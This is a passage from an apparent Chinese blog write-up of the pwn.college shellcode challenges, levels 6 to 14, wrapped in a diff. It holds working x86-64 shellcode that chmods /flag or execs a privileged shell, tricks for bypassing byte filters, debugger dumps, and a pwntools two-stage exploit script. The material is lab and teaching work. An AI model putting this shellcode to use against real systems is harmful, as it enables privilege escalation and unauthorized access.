&quot;/bin/sh&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="level6-0x1000的不可写"><a href="#level6-0x1000的不可写" class="headerlink" title="level6 0x1000的不可写"></a>level6 0x1000的不可写</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">puts(&quot;Removing write permissions from first 4096 bytes of shellcode.\n&quot;);</span><br><span class="line">    assert(mprotect(shellcode_mem, 4096, PROT_READ|PROT_EXEC) == 0);</span><br></pre></td></tr></table></figure>
+
+<p>使前0x1000byte数据不可写，但没关系，我们上一关用的是堆栈，而且&#x2F;bin&#x2F;sh是直接硬编码到shellcode</p>
+<h1 id="level7-关闭stdin，stdout，stderr"><a href="#level7-关闭stdin，stdout，stderr" class="headerlink" title="level7 关闭stdin，stdout，stderr"></a>level7 关闭stdin，stdout，stderr</h1><p>level1提到的chmod其实就没问题，但是看到有个佬搓了个socket连接。。。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line"></span><br><span class="line">    mov rax, 90          </span><br><span class="line">    lea rdi, [rip+flag]  </span><br><span class="line">    mov rsi, 0x1A4        </span><br><span class="line">    syscall</span><br><span class="line">flag:</span><br><span class="line">    .string &quot;/flag&quot;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<h1 id="level8-shortshellcode"><a href="#level8-shortshellcode" class="headerlink" title="level8 shortshellcode"></a>level8 shortshellcode</h1><p>本关只有18字节的shellcode可写，但我们可以通过软连接的方法，再尽力压缩shellcode，比如用push，pop，使用低位寄存器之类的方法</p>
+<p>当程序访问一个软链接时，linux会意识到这是一个软链接，然后读取原始文件</p>
+<p>那就很简单了</p>
+<p>如果说非常短的shellcode，前面的chmod一定算一个，只需设置三个寄存器(rdi,rsi,rax)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line"></span><br><span class="line">    mov al,90         </span><br><span class="line">    push 0x61</span><br><span class="line">    mov rdi,rsp</span><br><span class="line">    push 4</span><br><span class="line">    pop rsi      </span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我将flag软链接为当前目录下的a</p>
+<p>看另外师傅的，还可以考虑execve(“.&#x2F;c”,0,0)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash -p</span><br><span class="line">cat /flag</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line"></span><br><span class="line">    mov al,0x3b</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    xor rdx,rdx</span><br><span class="line">    push 0x63</span><br><span class="line">    mov rdi,rsp</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>
+
+<p>还有个新的指令</p>
+<p>cdq:把eax的最高位赋给edx的每一位，这个指令只有1字节，这个就相当于xor edx,edx了</p>
+<p>level 13和level14还有更变态的short shellcode</p>
+<h1 id="level9-跳过中断"><a href="#level9-跳过中断" class="headerlink" title="level9 跳过中断"></a>level9 跳过中断</h1><p>挑战每隔10字节就会使用int 3覆写我们的shellcode，会变成这样</p>
+<p>Address      |                      Bytes                    |          Instructions</p>
+<hr>
+<p>0x0000000016ec6000 | b0 3b                                         | mov al, 0x3b<br>0x0000000016ec6002 | 48 31 f6                                      | xor rsi, rsi<br>0x0000000016ec6005 | 48 31 d2                                      | xor rdx, rdx<br>0x0000000016ec6008 | 6a 63                                         | push 0x63<br>0x0000000016ec600a | cc                                            | int3<br>0x0000000016ec600b | cc                                            | int3<br>0x0000000016ec600c | cc                                            | int3<br>0x0000000016ec600d | cc                                            | int3<br>0x0000000016ec600e | cc                                            | int3 </p>
+<hr>
+<p>原本的应该是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0000000000401000 &lt;_start&gt;:</span><br><span class="line">  401000:       b0 3b                   mov    $0x3b,%al</span><br><span class="line">  401002:       48 31 f6                xor    %rsi,%rsi</span><br><span class="line">  401005:       48 31 d2                xor    %rdx,%rdx</span><br><span class="line">  401008:       6a 63                   push   $0x63</span><br><span class="line">  40100a:       48 89 e7                mov    %rsp,%rdi</span><br><span class="line">  40100d:       0f 05                   syscall</span><br></pre></td></tr></table></figure>
+
+<p>看了一下源码，对输入的shellcode进行处理，每过10字节变将其变成10字节的中断，那就用跳转来绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for (int i = 0; i &lt; shellcode_size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if ((i / 10) % 2 == 1)</span><br><span class="line">        &#123;</span><br><span class="line">            ((unsigned char *) shellcode_mem)[i] = &#x27;\xcc&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line"></span><br><span class="line">    mov al,0x3b</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    xor rdx,rdx</span><br><span class="line">    jmp shell</span><br><span class="line">    .rept 10</span><br><span class="line">    nop</span><br><span class="line">    .endr</span><br><span class="line"></span><br><span class="line">shell:</span><br><span class="line">    push 0x63</span><br><span class="line">    mov rdi,rsp</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="level10-排序shellcode"><a href="#level10-排序shellcode" class="headerlink" title="level10 排序shellcode"></a>level10 排序shellcode</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">This challenge just sorted your shellcode using bubblesort. Keep in mind the impact of memory endianness on this sort</span><br><span class="line">(e.g., the LSB being the right-most byte).</span><br><span class="line">This sort processed your shellcode 8 bytes at a time.</span><br></pre></td></tr></table></figure>
+
+<p>挑战的描述其实有问题</p>
+<p>他是把shellcode拆分成小端64位，然后对其排序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int sort_max = shellcode_size / sizeof(uint64_t) - 1;</span><br><span class="line">    for (int i = 0; i &lt; sort_max; i++)</span><br><span class="line">        for (int j = 0; j &lt; sort_max-i-1; j++)</span><br><span class="line">            if (input[j] &gt; input[j+1])</span><br><span class="line">            &#123;</span><br><span class="line">                uint64_t x = input[j];</span><br><span class="line">                uint64_t y = input[j+1];</span><br><span class="line">                input[j] = y;</span><br><span class="line">                input[j+1] = x;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是只要shellcode长度小于16字节那也不会排序</p>
+<h1 id="level11-关闭stdin的level10"><a href="#level11-关闭stdin的level10" class="headerlink" title="level11 关闭stdin的level10"></a>level11 关闭stdin的level10</h1><p>和上关一样，但是关闭了stdin</p>
+<p>不清楚，但是level10秒了</p>
+<h1 id="level12-无重复字节"><a href="#level12-无重复字节" class="headerlink" title="level12 无重复字节"></a>level12 无重复字节</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">    </span><br><span class="line">    cdq</span><br><span class="line">    mov al,0x3b</span><br><span class="line">    xor esi,esi</span><br><span class="line">    push 0x63</span><br><span class="line">    mov rdi,rsp</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>用objdump边看边改就行了</p>
+<p>正好用到了之前的cdq</p>
+<h1 id="level13-更短的shellcode"><a href="#level13-更短的shellcode" class="headerlink" title="level13 更短的shellcode"></a>level13 更短的shellcode</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode_size = read(0, shellcode_mem, 0xc);</span><br></pre></td></tr></table></figure>
+
+<p>这次只有0xc的长度，幸亏学到了cdq，这个只占一字节的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">    </span><br><span class="line">    cdq</span><br><span class="line">    mov al,0x3b</span><br><span class="line">    xor esi,esi</span><br><span class="line">    push 0x63</span><br><span class="line">    mov rdi,rsp</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>极限通过啊</p>
+<h1 id="level14-丧心病狂的短"><a href="#level14-丧心病狂的短" class="headerlink" title="level14 丧心病狂的短"></a>level14 丧心病狂的短</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reading 0x6 bytes from stdin.</span><br></pre></td></tr></table></figure>
+
+<p>正常的shellcode肯定是凑不到那么短了，来gdb看一下程序内有什么可以利用的</p>
+<p>执行shellcode时的场景</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────</span><br><span class="line">*RAX  0x0</span><br><span class="line"> RBX  0x5555555557e0 (__libc_csu_init) ◂— endbr64 </span><br><span class="line">*RCX  0x7ffff6d15297 ◂— cmp rax, -01000h /* &#x27;H=&#x27; */</span><br><span class="line">*RDX  0x214b7000 ◂— xor dword ptr [rdx], esi /* 0xa333231; &#x27;123\n&#x27; */</span><br><span class="line">*RDI  0x7ffff6df57e0 ◂— 0x0</span><br><span class="line">*RSI  0x7ffff6df4723 ◂— 0xdf57e0000000000a /* &#x27;\n&#x27; */</span><br><span class="line">*R8   0x16</span><br><span class="line">*R9   0x1c</span><br><span class="line">*R10  0x555555556113 ◂— 0x525245000000000a /* &#x27;\n&#x27; */</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  0x555555555200 (_start) ◂— endbr64 </span><br><span class="line"> R13  0x7fffffffdfd0 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7fffffffdee0 ◂— 0x0</span><br><span class="line">*RSP  0x7fffffffdea0 —▸ 0x7fffffffdec6 ◂— 0x2710555552000000</span><br><span class="line">*RIP  0x5555555557c1 (main+634) ◂— call rdx</span><br><span class="line">───────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x5555555557c1 &lt;main+634&gt;              call   rdx                           &lt;0x214b7000&gt;</span><br><span class="line"> </span><br><span class="line">   0x5555555557c3 &lt;main+636&gt;              lea    rdi, [rip + 0cdah]</span><br><span class="line">   0x5555555557ca &lt;main+643&gt;              call   555555555130h                 &lt;puts@plt&gt;</span><br><span class="line"> </span><br><span class="line">   0x5555555557cf &lt;main+648&gt;              mov    eax, 0</span><br><span class="line">   0x5555555557d4 &lt;main+653&gt;              leave  </span><br><span class="line">   0x5555555557d5 &lt;main+654&gt;              ret    </span><br><span class="line"> </span><br><span class="line">   0x5555555557d6                         nop    word ptr cs:[rax + rax]</span><br><span class="line">   0x5555555557e0 &lt;__libc_csu_init&gt;       endbr64 </span><br><span class="line">   0x5555555557e4 &lt;__libc_csu_init+4&gt;     push   r15</span><br><span class="line">   0x5555555557e6 &lt;__libc_csu_init+6&gt;     lea    r15, [rip + 2553h]</span><br><span class="line">   0x5555555557ed &lt;__libc_csu_init+13&gt;    push   r14</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x7fffffffdea0 —▸ 0x7fffffffdec6 ◂— 0x2710555552000000</span><br><span class="line">01:0008│-038 0x7fffffffdea8 —▸ 0x7fffffffdfe8 —▸ 0x7fffffffe29a ◂— 0x0</span><br><span class="line">02:0010│-030 0x7fffffffdeb0 —▸ 0x7fffffffdfd8 —▸ 0x7fffffffe267 ◂— 0x0</span><br><span class="line">03:0018│-028 0x7fffffffdeb8 ◂— 0x1555557e0</span><br><span class="line">04:0020│-020 0x7fffffffdec0 ◂— 0x0</span><br><span class="line">05:0028│-018 0x7fffffffdec8 ◂— 0x271055555200</span><br><span class="line">06:0030│-010 0x7fffffffded0 —▸ 0x7fffffffdfe0 ◂— 0x0</span><br><span class="line">07:0038│-008 0x7fffffffded8 —▸ 0x7fffffffe0d0 ◂— 0x0</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0   0x5555555557c1 main+634</span><br><span class="line">   1   0x7ffff6c2b083</span><br><span class="line">   2   0x7ffff7ffc620</span><br><span class="line">   3   0x7fffffffdfd8</span><br><span class="line">   4      0x100000000</span><br><span class="line">   5   0x555555555547 main</span><br><span class="line">   6   0x5555555557e0 __libc_csu_init</span><br><span class="line">   7 0x9d8be56ad6e8e1ce</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rax=0 (syscall_read)</span><br><span class="line">rdi=?</span><br><span class="line">rsi=?</span><br><span class="line">rdx=shellcode地址</span><br></pre></td></tr></table></figure>
+
+<p>看起来可以使用read，将shellcode二次读入shellcode地址，二次shellcode前面应该填充一些nop，滑行一段距离保证能够执行到二次shellcode</p>
+<p>但是如何二次向程序发送数据，好吧，还得是pwntools，赞美pwntools</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">p = process(&#x27;/challenge/babyshell_level14&#x27;)</span><br><span class="line">shellcode1=b&quot;\x31\xff\x89\xd6\x0f\x05&quot;</span><br><span class="line">shellcode2=asm(shellcraft.execve(&quot;/bin//sh&quot;,[&quot;/bin//sh&quot;,&quot;-p&quot;],0))</span><br><span class="line">shellcode2=asm(shellcraft.nop())*0x50+shellcode2</span><br><span class="line">#print(disasm(shellcode2))</span><br><span class="line">p.send(shellcode1)</span><br><span class="line">sleep(1)</span><br><span class="line">p.send(shellcode2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>shellcode1这里是读取shellcode的字节码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rsi,rax</span><br><span class="line">xor rax,rax</span><br><span class="line">push 0</span><br><span class="line">pop rdi</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/pwn-college/" rel="tag"># pwn-college</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/07/12/Kernel-1/" rel="prev" title="Kernel-1">
+      <i class="fa fa-chevron-left"></i> Kernel-1
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/10/18/pwn-college-talking-web/" rel="next" title="talking-web">
+      talking-web <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level1-%E6%97%A0%E8%BF%87%E6%BB%A4"><span class="nav-number">2.</span> <span class="nav-text">level1 无过滤</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#orw"><span class="nav-number">2.1.</span> <span class="nav-text">orw</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">2.2.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#chmod"><span class="nav-number">2.3.</span> <span class="nav-text">chmod</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level2-nop%E6%BB%91%E8%A1%8C"><span class="nav-number">3.</span> <span class="nav-text">level2 nop滑行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level3-%E7%A6%81%E6%AD%A2NULL"><span class="nav-number">4.</span> <span class="nav-text">level3 禁止NULL</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level4-%E7%A6%81%E6%AD%A2REX%E5%89%8D%E7%BC%80"><span class="nav-number">5.</span> <span class="nav-text">level4 禁止REX前缀</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-5-%E7%A6%81%E6%AD%A2%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="nav-number">6.</span> <span class="nav-text">level 5 禁止系统调用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level6-0x1000%E7%9A%84%E4%B8%8D%E5%8F%AF%E5%86%99"><span class="nav-number">7.</span> <span class="nav-text">level6 0x1000的不可写</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level7-%E5%85%B3%E9%97%ADstdin%EF%BC%8Cstdout%EF%BC%8Cstderr"><span class="nav-number">8.</span> <span class="nav-text">level7 关闭stdin，stdout，stderr</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level8-shortshellcode"><span class="nav-number">9.</span> <span class="nav-text">level8 shortshellcode</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level9-%E8%B7%B3%E8%BF%87%E4%B8%AD%E6%96%AD"><span class="nav-number">10.</span> <span class="nav-text">level9 跳过中断</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level10-%E6%8E%92%E5%BA%8Fshellcode"><span class="nav-number">11.</span> <span class="nav-text">level10 排序shellcode</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level11-%E5%85%B3%E9%97%ADstdin%E7%9A%84level10"><span class="nav-number">12.</span> <span class="nav-text">level11 关闭stdin的level10</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level12-%E6%97%A0%E9%87%8D%E5%A4%8D%E5%AD%97%E8%8A%82"><span class="nav-number">13.</span> <span class="nav-text">level12 无重复字节</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level13-%E6%9B%B4%E7%9F%AD%E7%9A%84shellcode"><span class="nav-number">14.</span> <span class="nav-text">level13 更短的shellcode</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level14-%E4%B8%A7%E5%BF%83%E7%97%85%E7%8B%82%E7%9A%84%E7%9F%AD"><span class="nav-number">15.</span> <span class="nav-text">level14 丧心病狂的短</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
